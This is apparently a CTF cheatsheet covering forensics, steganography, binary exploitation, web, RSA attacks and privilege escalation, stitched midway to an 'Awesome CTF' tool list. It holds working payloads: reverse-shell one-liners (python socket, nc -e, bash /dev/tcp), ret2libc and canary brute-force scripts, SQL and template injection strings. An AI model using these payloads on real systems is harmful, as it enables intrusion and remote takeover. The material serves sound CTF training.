    - `strings <file.xyz>`
    - Finds all printable characters in a file
- hexedit
    - `hexedit <file.xyz>`
    - You may have to change the file signature on some images for them to open
    - [List of common file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)
- Ghex (another hex editor but with GUI. Good if you need to jump to a certain byte)
    - `ghex <file.xyz>`
- docx files are containers so you can unzip them to find hidden content
    - `unzip <file.docx>`
- Grep - A good way to use grep to find the flag recursively:
    - `grep -r --text 'picoCTF{.*}'`
    - `egrep -r --text 'picoCTF{.*?}`
    - You can change 'picoCTF' to the beginning of the flag you are looking for
- Ltrace - Allows you to see what the code is doing as you run the program:
    - `ltrace ./<file>`
    - `ltrace -s 100 ./<file>`
        - Ltrace shortens very long strings. You can use -s to increase how many characters ltrace shows. Good for when looking at strcmp that have large strings.
        
    

#### Audio
{:#audio}

- Fax machine audio:
    - [Example](https://devcraft.io/2018/04/08/sunshine-ctf-2018.html)
    - [Decoder](http://www.dxsoft.com/en/products/seatty/)
- SSTV (slow-scan tv) audio (moon stuff)
    - [Example](https://ctftime.org/writeup/25606)
    - [Decoder](https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04)
    - [Alt Decoder](https://www.blackcatsystems.com/software/sstv.html)
    - Use these qsstv settings:
    
    ![SSTV settings](./.resources/SSTV_settings.png)

- Spectrogram image
    - [Decoder](https://academo.org/demos/spectrum-analyzer/)
- Change pitch, speed, direction...
    - [Pitch, speed, tune](https://29a.ch/timestretch/)
    - [Reverse](https://audiotrimmer.com/online-mp3-reverser/)
- DTMF (dual tone multiple frequency) phone keys
    - `multimon-ng -a DTMF -t wav <file.wav>`
        - Keep in mind that these could me multitap letters.
            - [This](https://www.dcode.fr/multitap-abc-cipher) can decode the numbers into text
- Cassette tape
    - [Example](https://ctftime.org/writeup/25597)
    - [Decoder](https://github.com/lunderhage/c64tapedecode) (wav to **tap** files)
- Morse code
    - [Decoder](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)

#### Image
{:#image}

- [stegsolve](https://stegonline.georgeom.net/upload)
    - Switch through bits
- [foremost](https://github.com/korczis/foremost)
    - Special tool for extracting images
    - Can be used to put together broken images (in pcap for example)
- [Depix](https://github.com/beurtschipper/Depix)
    - Unpixelate text
- Check if something was photoshopped (look at highlights)
    - [https://29a.ch/photo-forensics/#error-level-analysis](https://29a.ch/photo-forensics/#error-level-analysis)
- [zsteg](https://github.com/zed-0xff/zsteg)
    - LSB decoder
- [jsteg](https://github.com/lukechampine/jsteg)
    - jpeg steganography solver
- [pixrecovery](https://online.officerecovery.com/pixrecovery/)
    - so far the most effective png recovery tool i've found (as long as you don't care about watermarks)
    - [photopea](https://www.photopea.com/) also works very well
- [crc32fix](https://github.com/Aloxaf/crc32fix)
    - fix height and width of png based on checksum
- [PCRT](https://github.com/sherlly/PCRT)
    - fix png header and footer info
    
- [png-crc-fix](https://github.com/landaire/png-crc-fix)
    - fix png checksum
- pngcheck
    - find out if there are errors in the png
    - pngcheck <file>

#### Video
{:#video}

#### Machine Image
{:#machine-image}

- Recovering files
    - `photorec <file.bin>`
- You can mount an image as a virtual machine
    - [https://habr.com/en/post/444940/](https://habr.com/en/post/444940/)
- Mount a `.img` file:
    - `binwalk -M --dd=".*" <fileName>`
    - run `file` on output and select the Linux filesystem file
    - `losetup /dev/loop<freeLoopNumber> <fileSystemFile>`

#### Pcap
{:#pcap}

- Extract data with tcpflow
    - `tcpflow -r <file.pcap>`
- Extract data with wireshark
    - File ‚Üí Export Objects ‚Üí Make selection
    

## Pwn / Binary Exploitation
{:#pwn--binary-exploitation}

- **For this one, I suggest looking at my [LearnPwn](https://github.com/Adamkadaban/LearnPwn) repo instead, as this cheatsheet was made before I knew much about pwn**
    - However, I have included _some_ notes amending to what I have here.

#### General
{:#general-1}

- check security of ELF
    - `checksec <binary>`
    - `rabin2 -I <binary>`
- check security of PE
    - [binary-security-check](https://github.com/koutheir/binary-security-check)
    - `binary-security-check <bin>.exe`
- check seccomp bpf
    - [seccomp-tools](https://github.com/david942j/seccomp-tools)
    - `seccomp-tools dump ./<binary>`
- look at symbols
    - `readelf -s <binary>`
- look at strings
    - `rabin2 -z <binary>`
- pack address to byte
    - little endian (for 32 bits)
        - `python -c "import pwn; print(pwn.p32(<intAddr>))`
    - big endian (for 64 bits)
        - `python -c "import pwn; print(pwn.p64(<intAddr>))`
    - pwntools automatically packs addresses with the correct endianness for you

#### Buffer overflow
{:#buffer-overflow}

- If you ever need to get a /bin/sh shell and you are sure it works but the program exits anyways, use this trick:
    - `( python -c "print '<PAYLOAD>'" ; cat ) | ./<program>`
    - pwntools does this with its `process.interactive()`

#### PIE (Positional Independent Execution)
{:#pie-positional-independent-execution}

- determine random value
    - `pwn cyclic <numChars>` to generate payload
    - `dmesg | tail | grep segfault` to see where error was
    - `pwn cyclic -l 0x<errorLocation>` to see random offset to control instruction pointer
    - [example](https://www.youtube.com/watch?v=WNh3tFysYXY&ab_channel=JohnHammond)

#### NX (Non-executable)
{:#nx-non-executable}

- We can use ROP (return oriented programming) to solve


#### ROP (for statically compiled binaries)
{:#rop-for-statically-compiled-binaries}

- ROPGadget
    - view gadgets & automatically generate ropchains
    - `ROPgadget --ropchain --binary <binary>`
        - You can then add padding at the start of the code (based on the difference between your buffer and return address) and run the code to get a shell
        - [Demo](https://www.youtube.com/watch?v=MSy0rdi1vbo&ab_channel=BenGreenberg)
- ropr

#### Stack Canary
{:#stack-canary}

**Finding the stack canary in a debugger**
- Stack canary is a value placed before the EIP/RIP (instruction pointer) that can overwritten by a buffer overflow. The program causes an error basically if the stack is overwritten to something different than it originally was. Our goal is to find the original stack so when we overflow, the program runs normally.
- The stack canary is taken from `gs`, or `fs` (for 32 and 64 bit respectively)
    - In the disassembly, before something is read, you can see a line similar to the following:

```
   0x000000000000121a <+4>: sub    rsp,0x30
   0x000000000000121e <+8>: mov    rax,QWORD PTR fs:0x28
   0x0000000000001227 <+17>:mov    QWORD PTR [rbp-0x8],rax
   0x000000000000122b <+21>:xor    eax,eax

```
- Here, the stack canary is moved into `rax` at offset +8.
    - Thus, break at the next offset and check what's in rax (`i r rax`) to see what the current canary is

**Static Canaries**
- A canary is only static if it was manually implemented by the programmer (which is the case in some intro pwn challenges), or if you are able to fork the program.
    - When you fork the binary, the forked one has the same canary, so you can do a byte-by-byte bruteforce on that

**Extra**
- When a stack canary is improperly overwritten, it will cause a call to `__stack_chk_fail`
    - If we can't leak the canary, we can also modify the GOT table to prevent it from being called
- The canary is stored in the `TLS` structure of the current stack and is initialized by `security_init`
    - If you can overwrite the real canary value, you can set it equal whatever you decide to overflow.

- Simple script to bruteforce a static 4 byte canary:

```python
#!/bin/python3
from pwn import *

#This program is the buffer_overflow_3 in picoCTF 2018
elf = ELF('./vuln')

# Note that it's probably better to use the chr() function too to get special characters and other symbols and letters.
# But this canary was pretty simple :)
alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

canary = ''
# Here we are bruteforcing a canary 4 bytes long
for i in range(1,5):
    for letter in range(0,len(alphabet)):  # We will go through each letter/number in the string 'alphabet'
        p = elf.process()  # We start the process
        wait = p.recv().decode('utf-8')
        p.sendline(str(32+i))  # In this program, we had to specify how many bytes we were gonna send.
        wait = p.recv().decode('utf-8')
        p.sendline('A'*32 + canary + alphabet[letter])  # We send the 32 A's to overflow, and then the canary we already have + our guess
        prompt = p.recv().decode('utf-8')
        if "Stack" not in prompt:  # The program prints "Stack smashed [...]" if we get wrongfully write the canary.
            canary += alphabet[letter]  # If it doesn't print that, we got part of our canary :)
            break  # Move on to the next canary letter/number

print("The canary is: " + canary)
```

#### Format String Vulnerabilities
{:#format-string-vulnerabilities}

- Look at Table 2 for what to try if you see "printf(buf)" or something like that:
    - [https://owasp.org/www-community/attacks/Format_string_attack](https://owasp.org/www-community/attacks/Format_string_attack)
- Highly recommend looking at John Hammond doing 'echooo' challenge from picoCTF 2018
- Sometimes, trying to print only strings from the stack like this: '%s %s %s %s %s %s' may cause errors since not everything in the stack is a string.
- Try to minimize that by doing '%x %x %x %x %x %s' instead
- Instead of having to constantly increase how many %x and %s you type, you can pass a parameter to make it easier:
    - `%1$s` - This will print the first value in the stack (from what I understand, the one right next to your buffer) as a string.
    - `%2$s` - This will print the 2nd value as a string, and you get the idea
    - You can use one-liner loops to try to find the flag by leaking the stack. Press ^C (CTRL + C) to go to the next value.
        - `for i in {1..100}; do echo "%$i\$s" | nc [b7dca240cf1fbf61.247ctf.com](http://b7dca240cf1fbf61.247ctf.com/) 50478; done`
- You can control how much you leak using different size parameters:
    - `%hhx` leaks 1 byte (half of half of int size)
    - `%hx` leaks 2 bytes (half of int size)
    - `%x` leaks 4 bytes (int size)
    - `%lx` leaks 8 bytes (long size)
- very good video on modifying the stack with fstring vuln and %n:
    - [https://www.youtube.com/watch?v=gzLPVkZbaPA&ab_channel=MartinCarlisle](https://www.youtube.com/watch?v=gzLPVkZbaPA&ab_channel=MartinCarlisle)
    


#### Shellcode
{:#shellcode}

- Good website to find different shellcode:
    - [http://shell-storm.org/shellcode/](http://shell-storm.org/shellcode/)

#### Return-to-Libc
{:#return-to-libc}

- We will overwrite the EIP to call the system() library function and we will also pass what it should execute, in this example a buffer with "/bin/sh"
- Good explanation:
    - [https://www.youtube.com/watch?v=FvQYGAM1X9U&ab_channel=NPTEL-NOCIITM](https://www.youtube.com/watch?v=FvQYGAM1X9U&ab_channel=NPTEL-NOCIITM)
- Good example (go to 3:22:44):
    - [https://www.youtube.com/watch?v=uIkxsBgkpj8&t=13257s&ab_channel=freeCodeCamp.org](https://www.youtube.com/watch?v=uIkxsBgkpj8&t=13257s&ab_channel=freeCodeCamp.org)
    - [https://www.youtube.com/watch?v=NCLUm8geskU&ab_channel=BenGreenberg](https://www.youtube.com/watch?v=NCLUm8geskU&ab_channel=BenGreenberg)
- Get address for execve("/bin/sh")
    - `one_gadget <libc file>`

- If you already know the libc file and a location (ie. dont have to leak them...)
    
```python
#!/bin/python3

from pwn import *
import os

binaryName = 'ret2libc1'

# get the address of libc file with ldd
libc_loc = os.popen(f'ldd {binaryName}').read().split('\n')[1].strip().split()[2]

# use one_gadget to see where execve is in that libc file
one_gadget_libc_execve_out = [int(i.split()[0], 16) for i in os.popen(f'one_gadget {libc_loc}').read().split("\n") if "execve" in i]

# pick one of the suitable addresses
libc_execve_address = one_gadget_libc_execve_out[1]

p = process(f'./{binaryName}')
e = ELF(f'./{binaryName}')
l = ELF(libc_loc)

# get the address of printf from the binary output
printf_loc = int(p.recvuntil('\n').rstrip(), 16)

# get the address of printf from libc
printf_libc = l.sym['printf']

# calculate the base address of libc
libc_base_address = printf_loc - printf_libc

# generate payload

# 0x17 is from gdb analysis of offset from input to return address
offset = 0x17

payload = b"A"*offset
payload += p64(libc_base_address + libc_execve_address)

# send the payload
p.sendline(payload)

# enter in interactive so we can use the shell created from our execve payload
p.interactive()
```
    

## Reverse Engineering
{:#reverse-engineering}

> Cool Guide: [https://opensource.com/article/20/4/linux-binary-analysis](https://opensource.com/article/20/4/linux-binary-analysis)
 
- [Ghidra](https://ghidra-sre.org/)
    - Very useful decompiler
- dotPeek or dnSpy
    - decompile .NET executables
- [jadx](https://github.com/skylot/jadx) and jadx-gui
    - decompile apks
- [devtoolzone](https://devtoolzone.com/decompiler/java)
    - decompile java online
- [Quiltflower](https://github.com/QuiltMC/quiltflower/)
    - Advanced terminal-based java decompiler
- apktool
    - decompile apks
    - `apktool d *.apk`
- [gdb](https://www.gnu.org/software/gdb/)
    - Binary analysis
    - [peda](https://github.com/longld/peda) (extension for increased functionality)
    - [gef](https://github.com/hugsy/gef) (gdb extension for pwners)
- [radare2](https://github.com/radareorg/radare2)
    - Binary analysis
- [FLOSS](https://github.com/mandiant/flare-floss)
    - `strings` on steroids. Uses static analysis to find and calculate strings

#### SMT Solvers
{:#smt-solvers}
- [angr](https://github.com/angr/angr) (python)
    - [Docs](https://docs.angr.io/core-concepts/toplevel)
    - [Tutorial](https://github.com/Adamkadaban/CTFs/blob/master/.resources/SMT_Solvers.md)
- [z3](https://github.com/Z3Prover/z3)
    - [Tutorial](https://github.com/Adamkadaban/CTFs/blob/master/.resources/SMT_Solvers.md)

#### Reversing byte-by-byte checks (side-channel attack)
{:#reversing-byte-by-byte-checks-side-channel-attack}

[https://dustri.org/b/defeating-the-recons-movfuscator-crackme.html](https://dustri.org/b/defeating-the-recons-movfuscator-crackme.html)

- Here's a version I made for a challenge that uses a time-based attack:
    - You might have to run it a couple times just to account for randomness


```python
#!/bin/python3

from pwn import *
import string

keyLen = 8
binaryName = 'binary'

context.log_level = 'error'

s = ''
print("*"*keyLen)
for chars in range(keyLen):
    a = []
    for i in string.printable:
        p = process(f'perf stat -x, -e cpu-clock ./{binaryName}'.split())
        p.readline()
        currPass = s + i + '0'*(keyLen - chars - 1)
        # print(currPass)
        p.sendline(currPass.encode())
        p.readline()
        p.readline()
        p.readline()
        info = p.readall().split(b',')[0]
        p.close()
        try:
            a.append((float(info), i))
        except:
            pass
        # print(float(info), i)
    a.sort(key = lambda x: x[0])
    s += str(a[-1][1])
    print(s + "*"*(keyLen - len(s)))
    # print(sorted(a, key = lambda x: x[0]))

p = process(f'./{binaryName}')
p.sendline(s.encode())
p.interactive()
```

#### Searching strings with gef
{:#searching-strings-with-gef}

- If your flag is being read into a variable or register at any point, you can break after it is moved and run `grep <string>` and gef will automatically show you the string that matches your search pattern

## Web
{:#web-1}

- [Nikto](https://tools.kali.org/information-gathering/nikto) (if allowed)
    - automatically looks for vulnerabilities
- [gobuster](https://tools.kali.org/web-applications/gobuster) (if allowed)
    - Brute forces directories and files
- [hydra](https://tools.kali.org/password-attacks/hydra) (if allowed)
    - Brute forces logins for various services
- [BurpSuite](https://portswigger.net/burp)
    - Intercepts web requests and allows you to modify them
- [Wireshark](https://www.wireshark.org/)
    - Analyze live network traffic and pcap files
- [php reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php)
    - Useful for websites that allow you to upload files
    - This file needs to be executed on the server to work
- [WPScan](http://wpscan.com)
    - Scan wordpress websites
    - Use `wpscan --url <site> --plugins-detection mixed -e` with an api key for best results
- [jwt](https://jwt.io/)
    - You can identify a JWT token since base64-encoded json (and thus jwt tokens) begins with "ey"
    - This site will decode JSON web tokens
    - You can crack the secret for the JSON web token to modify and sign your own tokens
        - `echo <token> > jwt.txt`
        - `john jwt.txt`
- SQL injection
    - sqlmap
        - `sqlmap --forms --dump-all -u <url>`
        - Automates the process of SQL injection
    - Basic SQL injection
        - Enter `'OR 1=1--` in login form
        - On the server this will evaluate to `SELECT * FROM Users WHERE User = '' OR 1=1--'  AND Pass = ''`
        - `1=1` evaluates to true, which satisfies the `OR` statement, and the rest of the query is commented out by the `--`
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
    - Great resource for web exploitation with lots of payloads
- Template Injection
    - [tplmap](https://github.com/epinna/tplmap)
        - Automated server-side template injection
    - Jinja Injection
        - \{\{ config.items() \}\}
    - Flask Injection
        - \{\{ config \}\}
    - Python eval() function
        - `__import__.('subprocess').getoutput('<command>')`
            - make sure to switch the parentheses if it doesn't work
        - `__import__.('subprocess').getoutput('ls').split('\\n')`
            - list files in system
    - [More python injection](https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1)
- Cross Site Scripting
    - [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
        - Google's Content Security Policy Evaluator

### Fuzzing input fields
{:#fuzzing-input-fields}

- FFUF
    - Copy the request to the input field and replace the parameter with "FUZZ":
        - `ffuf -request input.req -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt -mc all`
        - Use `-fs` to filter sizes

## Crypto
{:#crypto-1}

### CyberChef
{:#cyberchef}

- [CyberChef](https://gchq.github.io/CyberChef/)
    - Carries out various cryptography operations
    

[Cipher Detector](https://www.boxentriq.com/code-breaking/cipher-identifier)

### Hashes

- hashid
    - Command-line utility to detect the hash type

### Common Ciphers
{:#common-ciphers}

- [Caesars Cipher](https://www.dcode.fr/caesar-cipher)
- [Vigenere Cipher](https://www.dcode.fr/vigenere-cipher)
    
```python
#### Solver using custom table
cipherText = ""
plainText = ""
flagCipherText = ""
tableFile = ""

with open(cipherText) as fin:
    cipher = fin.readline().rstrip()

with open(plainText) as fin:
    plain = fin.readline().rstrip()

with open(flagCipherText) as fin:
    flag = fin.readline().rstrip()

with open(tableFile) as fin:
    table = [i.rstrip().split() for i in fin.readlines()]

table[0].insert(0, "") # might have to modify this part.
            # just a 2d array with the lookup table
            # should still work if the table is slightly off, but the key will be wrong
key = ""
for i, c in enumerate(plain[0:100]):
  col = table[0].index(c)
  for row in range(len(table)):
    if table[row][col] == cipher[i]:
      key += table[row][0]
      break

print(key)

dec_flag = ""
for i, c in enumerate(flag[:-1]):
  col = table[0].index(key[i])
  for row in range(len(table)):
    if table[row][col] == flag[i]:
      dec_flag += table[row][0]
      break

print(dec_flag)
```
    
- [Substitution Cipher](https://www.quipqiup.com/)
- [Rot13](https://rot13.com/)
- [Keyed Caesars cipher](https://www.boxentriq.com/code-breaking/keyed-caesar-cipher)

### RSA
{:#rsa}

#### Grab RSA Info with pycryptodome
{:#grab-rsa-info-with-pycryptodome}

```python
from Crypto.PublicKey import RSA

keyName = "example.pem"

with open(keyName,'r') as f:
    key = RSA.import_key(f.read())

print(key)

# You can also get individual parts of the RSA key 
# (sometimes not all of these)
print(key.p)
print(key.q)
print(key.n)
print(key.e)
print(key.d)
print(key.u)

# public keys have n and e

```

#### Chinese Remainder Theorem (p,q,e,c)
{:#chinese-remainder-theorem-pqec}

- Use this when you can factor the number `n`
    - Bad implementations will have more than one prime factor
    - [Proof](https://www.di-mgt.com.au/crt_rsa.html)

- Old

```python
def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    g, y, x = egcd(b%a,a)
    return (g, x - (b//a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('No modular inverse')
    return x%m

p = 
q = 
e = 
c = 

n = p*q # use factordb command or website to find factors

phi = (p-1)*(q-1) # phi is simply the product of (factor_1-1) * ... * (factor_n -1)

d = modinv(e, phi) # private key

# print(d)

m = pow(c,d,n) # decrypted plaintext message in long integer form

thing = hex(m)[2:] # ascii without extra stuff at the start (0x)
print(bytes.fromhex(thing).decode('ascii'))
```

- New

```python
#!/bin/python3
from Crypto.Util.number import *
from factordb.factordb import FactorDB

# ints:
n =    
e =  
c =  

f = FactorDB(n)
f.connect()
factors = f.get_factor_list()

phi = 1
for i in factors:
    phi *= (i-1)

d = inverse(e, phi)
m = pow(c, d, n)

flag = long_to_bytes(m).decode('UTF-8')
print(flag)
```

- Website that gives factors and euler's totient (phi)
    - [https://www.alpertron.com.ar/ECM.HTM](https://www.alpertron.com.ar/ECM.HTM)

#### Coppersmith attack (c,e)
{:#coppersmith-attack-ce}

- Usually used if the exponent is very small (e <= 5)
    - [Proof](https://web.eecs.umich.edu/~cpeikert/lic13/lec04.pdf)

```python
from Crypto.Util.number import *
def nth_root(radicand, index):
    lo = 1
    hi = radicand
    while hi - lo > 1:
        mid = (lo + hi) // 2
        if mid ** index > radicand:
            hi = mid
        else:
            lo = mid

    if lo ** index == radicand:
        return lo
    elif hi ** index == radicand:
        return hi
    else:
        return -1

c = 
e = 

plaintext = long_to_bytes(nth_root(c, e))
print(plaintext.decode("UTF-8"))

```

#### Pollards attack (n,e,c)
{:#pollards-attack-nec}

- Based on [Pollard's factorization method](http://www.math.columbia.edu/~goldfeld/PollardAttack.pdf), which makes products of primes [easy to factor](https://people.csail.mit.edu/rivest/pubs/RS01.version-1999-11-22.pdf) if they are (B)smooth 
    - This is the case if `p-1 | B!` and `q - 1` has a factor > `B`

```python
from Crypto.Util.number import *
from math import gcd

n = 
c = 
e = 

def pollard(n):
    a = 2
    b = 2
    while True:
        a = pow(a,b,n)
        d = gcd(a-1,n)
        if 1 < d < n: 
            return d
        b += 1

p = pollard(n)
q = n // p

phi = 1
for i in [p,q]:
    phi *= (i-1)

d = inverse(e, phi)
m = pow(c, d, n)

flag = long_to_bytes(m).decode('UTF-8')
print(flag)
```

#### Wiener Attack (n,e,c)
{:#wiener-attack-nec}

- For use when d is too small (or e is too big)
    - Using [this](https://github.com/orisano/owiener) python module
    - [Proof](https://sagi.io/crypto-classics-wieners-rsa-attack/)

```python
from Crypto.Util.number import *
import owiener

n = 
e = 
c = 

d = owiener.attack(e, n)
m = pow(c, d, n)

flag = long_to_bytes(m)
print(flag)
```

### Base16, 32, 36, 58, 64, 85, 91, 92
{:#base16-32-36-58-64-85-91-92}

[https://github.com/mufeedvh/basecrack](https://github.com/mufeedvh/basecrack)

## Box
{:#box}

### Connecting
{:#connecting}

- ssh
    - `ssh <username>@<ip>`
    - `ssh <username>@<ip> -i <private key file>`
    - Mount SSH in as a file system locally:
        - `sshfs -p <port> <user>@<ip>: <mount_directory>`
    - Known hosts
        - `ssh-copy-id -i ~/.ssh/id_rsa.pub <user@host>`
- netcat
    - `nc <ip> <port>`
    

### Enumeration
{:#enumeration}

- Machine discovery
    - `netdiscover`
- Machine port scanning
    - `nmap -sC -sV <ip>`
- Linux enumeration
    - `enum4linux <ip>`
    
- SMB enumeration
    - `smbmap -H <ip>`
- Connect to SMB share
    - `smbclient //<ip>/<share>`

### Privilege escalation
{:#privilege-escalation}

- [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
    - `./linpeas.sh`
    - Automatically looks for privilege escalation vectors
- List commands we can run as root
    - `sudo -l`
- Find files with the SUID permission
    - `find / -perm -u=s -type f 2>/dev/null`
    - These files execute with the privileges of the owner instead of the user executing them
- Find permissions for all services
    - `accesschk.exe -uwcqv *`
    - Look for services that are not under the System or Administrator accounts
- Query Service
    - `sc qc <service name>`
    - Only works in cmd.exe 

### Listen for reverse shell
{:#listen-for-reverse-shell}

- `nc -lnvp <port>`

### Reverse shell
{:#reverse-shell}

- revshells.com
    - templates for basically everything you might need
- `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
- `nc -e /bin/sh <ip> <port>`
- `bash -i >& /dev/tcp/<ip>/<port> 0>&1`

### Get interactive shell
{:#get-interactive-shell}

#### Linux
{:#linux}

1. Run the following python command to make it partially interactive: `python -c 'import pty;pty.spawn("/bin/bash");'`
2. Exit the netcat session with `CTRL+Z` and run `stty raw -echo` locally
3. Reenter your session with the command `fg` (and the job id afterward if needed)
4. Change your terminal emulator to xterm by running `export TERM=xterm` (this might not be necessary)
5. Change your shell to bash by running `export SHELL=bash` (this might not be necessary)
6. Done! Now your shell should be fully interactive

#### Windows / General
{:#windows--general}

1. Install `rlwrap` on your system
2. Now, every time you run a nc listener, just put `rlwrap` in front
3. For example: `rlwrap nc -lvnp 1337`
    * This will give you arrow keys and command history, but won't give autocompletion (as far as I can tell) for windows and *nix systems 

## OSINT
{:#osint}

- [pimeyes](https://pimeyes.com/en)
    - Reverse search faces on the internet
- [OSINT Framework](https://osintframework.com/)
    - Website that aggregates tons of OSINT tools
- [GeoSpy AI](https://geospy.ai)
	- Geospatial vision LLM that can estimate location just from an image
- [overpass turbo](https://overpass-turbo.eu)
	- Website that lets you query the OpenStreetMap API and visualize results
- [Bellingcat OSM search](https://osm-search.bellingcat.com/)
	- Website that lets you easily query the OSM API

## Misc
{:#misc}

- Resolving DNS Errors
    - `dig <site> <recordType>`
    - [List of record types](https://en.wikipedia.org/wiki/List_of_DNS_record_types)
        - Make sure you try TXT
- Run a binary as a different architecture
    - 64 bit:
        - `linux64 ./<binary>`
    - 32 bit:
        - `linux32 ./<binary>`
        
- Extract MS Macros:
    - [https://www.onlinehashcrack.com/tools-online-extract-vba-from-office-word-excel.php](https://www.onlinehashcrack.com/tools-online-extract-vba-from-office-word-excel.php)
- View CNC GCode
    - [https://ncviewer.com/](https://ncviewer.com/)

ba≈üka bir g√ºn
-------------

### Contents

- [Awesome CTF](#awesome-ctf)
  - [Create](#create)
    - [Forensics](#forensics)
    - [Platforms](#platforms)
    - [Steganography](#steganography)
    - [Web](#web)
  - [Solve](#solve)
    - [Attacks](#attacks)
    - [Bruteforcers](#bruteforcers)
    - [Cryptography](#crypto)
    - [Exploits](#exploits)
    - [Forensics](#forensics-1)
    - [Networking](#networking)
    - [Reversing](#reversing)
    - [Services](#services)
    - [Steganography](#steganography-1)
    - [Web](#web-1)

- [Resources](#resources)
  - [Operating Systems](#operating-systems)
  - [Starter Packs](#starter-packs)
  - [Tutorials](#tutorials)
  - [Wargames](#wargames)
  - [Websites](#websites)
  - [Wikis](#wikis)
  - [Writeups Collections](#writeups-collections)


# Create

*Tools used for creating CTF challenges*

- [Kali Linux CTF Blueprints](https://www.packtpub.com/eu/networking-and-servers/kali-linux-ctf-blueprints) - Online book on building, testing, and customizing your own Capture the Flag challenges.


## Forensics

*Tools used for creating Forensics challenges*

- [Dnscat2](https://github.com/iagox86/dnscat2) - Hosts communication through DNS.
- [Kroll Artifact Parser and Extractor (KAPE)](https://learn.duffandphelps.com/kape) - Triage program.
- [Magnet AXIOM](https://www.magnetforensics.com/downloadaxiom) - Artifact-centric DFIR tool.
- [Registry Dumper](http://www.kahusecurity.com/posts/registry_dumper_find_and_dump_hidden_registry_keys.html) - Dump your registry.

## Platforms

*Projects that can be used to host a CTF*

- [CTFd](https://github.com/isislab/CTFd) - Platform to host jeopardy style CTFs from ISISLab, NYU Tandon.
- [echoCTF.RED](https://github.com/echoCTF/echoCTF.RED) - Develop, deploy and maintain your own CTF infrastructure.
- [FBCTF](https://github.com/facebook/fbctf) - Platform to host Capture the Flag competitions from Facebook.
- [Haaukins](https://github.com/aau-network-security/haaukins)- A Highly Accessible and Automated Virtualization Platform for Security Education.
- [HackTheArch](https://github.com/mcpa-stlouis/hack-the-arch) - CTF scoring platform.
- [Mellivora](https://github.com/Nakiami/mellivora) - A CTF engine written in PHP.
- [MotherFucking-CTF](https://github.com/andreafioraldi/motherfucking-ctf) - Badass lightweight plaform to host CTFs. No JS involved.
- [NightShade](https://github.com/UnrealAkama/NightShade) - A simple security CTF framework.
- [OpenCTF](https://github.com/easyctf/openctf) - CTF in a box. Minimal setup required.
- [PicoCTF](https://github.com/picoCTF/picoCTF) - The platform used to run picoCTF. A great framework to host any CTF.
- [PyChallFactory](https://github.com/pdautry/py_chall_factory) - Small framework to create/manage/package jeopardy CTF challenges.
- [RootTheBox](https://github.com/moloch--/RootTheBox) - A Game of Hackers (CTF Scoreboard & Game Manager).
- [Scorebot](https://github.com/legitbs/scorebot) - Platform for CTFs by Legitbs (Defcon).
- [SecGen](https://github.com/cliffe/SecGen) - Security Scenario Generator. Creates randomly vulnerable virtual machines.

## Steganography

*Tools used to create stego challenges*

Check solve section for steganography.

## Web

*Tools used for creating Web challenges*

*JavaScript Obfustcators*

- [Metasploit JavaScript Obfuscator](https://github.com/rapid7/metasploit-framework/wiki/How-to-obfuscate-JavaScript-in-Metasploit)
- [Uglify](https://github.com/mishoo/UglifyJS)


# Solve

*Tools used for solving CTF challenges*

## Attacks

*Tools used for performing various kinds of attacks*

- [Bettercap](https://github.com/bettercap/bettercap) - Framework to perform MITM (Man in the Middle) attacks.
- [Yersinia](https://github.com/tomac/yersinia) - Attack various protocols on layer 2.

## Crypto

*Tools used for solving Crypto challenges*

- [CyberChef](https://gchq.github.io/CyberChef) - Web app for analysing and decoding data.
- [FeatherDuster](https://github.com/nccgroup/featherduster) - An automated, modular cryptanalysis tool.
- [Hash Extender](https://github.com/iagox86/hash_extender) - A utility tool for performing hash length extension attacks.
- [padding-oracle-attacker](https://github.com/KishanBagaria/padding-oracle-attacker) - A CLI tool to execute padding oracle attacks.
- [PkCrack](https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html) - A tool for Breaking PkZip-encryption.
- [QuipQuip](https://quipqiup.com) - An online tool for breaking substitution ciphers or vigenere ciphers (without key).
- [RSACTFTool](https://github.com/Ganapati/RsaCtfTool) - A tool for recovering RSA private key with various attack.
- [RSATool](https://github.com/ius/rsatool) - Generate private key with knowledge of p and q.
- [XORTool](https://github.com/hellman/xortool) - A tool to analyze multi-byte xor cipher.

## Bruteforcers

*Tools used for various kind of bruteforcing (passwords etc.)*

- [Hashcat](https://hashcat.net/hashcat/) - Password Cracker
- [Hydra](https://tools.kali.org/password-attacks/hydra) - A parallelized login cracker which supports numerous protocols to attack
- [John The Jumbo](https://github.com/magnumripper/JohnTheRipper) - Community enhanced version of John the Ripper.
- [John The Ripper](http://www.openwall.com/john/) - Password Cracker.
- [Nozzlr](https://github.com/intrd/nozzlr) - Nozzlr is a bruteforce framework, trully modular and script-friendly.
- [Ophcrack](http://ophcrack.sourceforge.net/) - Windows password cracker based on rainbow tables.
- [Patator](https://github.com/lanjelot/patator) - Patator is a multi-purpose brute-forcer, with a modular design.
- [Turbo Intruder](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack) - Burp Suite extension for sending large numbers of HTTP requests 

## Exploits

*Tools used for solving Exploits challenges*

- [DLLInjector](https://github.com/OpenSecurityResearch/dllinjector) - Inject dlls in processes.
- [libformatstr](https://github.com/hellman/libformatstr) - Simplify format string exploitation.
- [Metasploit](http://www.metasploit.com/) - Penetration testing software.
  - [Cheatsheet](https://www.comparitech.com/net-admin/metasploit-cheat-sheet/)
